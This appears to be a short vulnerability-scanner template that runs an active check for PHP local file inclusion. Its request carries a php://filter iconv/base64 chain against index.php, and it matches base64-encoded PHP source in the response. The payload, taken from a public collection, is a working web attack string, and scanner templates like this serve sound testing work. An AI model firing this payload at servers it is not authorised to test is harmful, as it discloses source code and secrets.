id: patt-lfi-chain-01-path
name: 'PATT lfi patt-lfi-chain-01 via path'
severity: critical
type: active
tags:
  - lfi
  - patt
  - wrapperphp
requires:
  - php
description: 'PATT filter-chain (php_filter_chain_generator) when read only without upload. [patt:patt-lfi-chain-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Wrappers.md]'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      path:
        - 'php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=index.php'
    matchers:
      - type: word
        part: body
        words:
          - 'PD9waHA'
